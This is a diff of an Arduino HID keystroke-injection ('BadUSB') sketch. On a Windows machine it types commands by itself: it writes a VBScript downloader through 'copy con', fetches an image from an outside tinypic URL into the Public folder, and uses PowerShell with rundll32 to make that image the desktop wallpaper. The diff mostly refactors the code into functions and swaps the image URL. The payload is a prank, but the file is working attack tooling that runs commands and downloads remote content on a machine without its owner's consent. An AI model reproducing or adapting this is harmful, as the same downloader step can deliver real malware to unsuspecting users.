@@ -11,7 +11,6 @@ void typeKey(int key)
   Keyboard.release(key);
 }
 
-
 void esp_print(String text){
   for (int i = 0; i<=text.length(); i++)
   {
@@ -100,7 +99,6 @@ void changedir(String letter, String directory){
 void createdownlscript(){
   Keyboard.print("copy con download.vbs");
   typeKey(KEY_RETURN);
-  // Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
   esp_print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
   typeKey(KEY_RETURN);
   esp_print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
@@ -145,15 +143,10 @@ void changewallpaper(String letter, String directory, String imagename){
   delay(1000);
   esp_print("rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True");
   typeKey(KEY_RETURN);
-  delay(250);
+  delay(500);
 }
 
-void main_(){
-  String letter = "C:";
-  String directory = "Users\\Public";
-  String imagename = "nl8lz7.jpg";
-  String url = "http://i65.tinypic.com/nl8lz7.jpg";
-  
+void downloadimage(String letter, String directory, String imagename, String url){
   opencmd();
   delay(100);
   changedir(letter, directory);
@@ -167,17 +160,21 @@ void main_(){
   Keyboard.print("exit");
   typeKey(KEY_RETURN);
   delay(1000);
-  
+}
+
+void updatewallpaper(String letter, String directory, String imagename){
   openpowershell();
-  delay(1000);
-  for (int i = 0; i<=7; i++)
+  delay(3000);
+  for (int i = 0; i<=5; i++)
   {
     changewallpaper(letter, directory, imagename);
   }
   Keyboard.print("exit");
   typeKey(KEY_RETURN);
-  delay(100);  
-  
+  delay(100);
+}
+
+void clean(String letter, String directory, String imagename){
   opencmd();
   delay(100);
   changedir(letter, directory);
@@ -186,17 +183,21 @@ void main_(){
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("exit");
-  typeKey(KEY_RETURN);    
+  typeKey(KEY_RETURN);
 }
 
-/* Init function */
 void setup()
 { 
   // Begining the Keyboard stream
   Keyboard.begin();
   delay(500);
-  
-  main_();   
+  String letter = "C:";
+  String directory = "Users\\Public";
+  String imagename = "34gvq4g.jpg";
+  String url = "http://oi67.tinypic.com/34gvq4g.jpg";
+  downloadimage(letter, directory, imagename, url);
+  updatewallpaper(letter, directory, imagename); 
+  //clean(letter, directory, imagename);  
   Keyboard.end();
 }
 
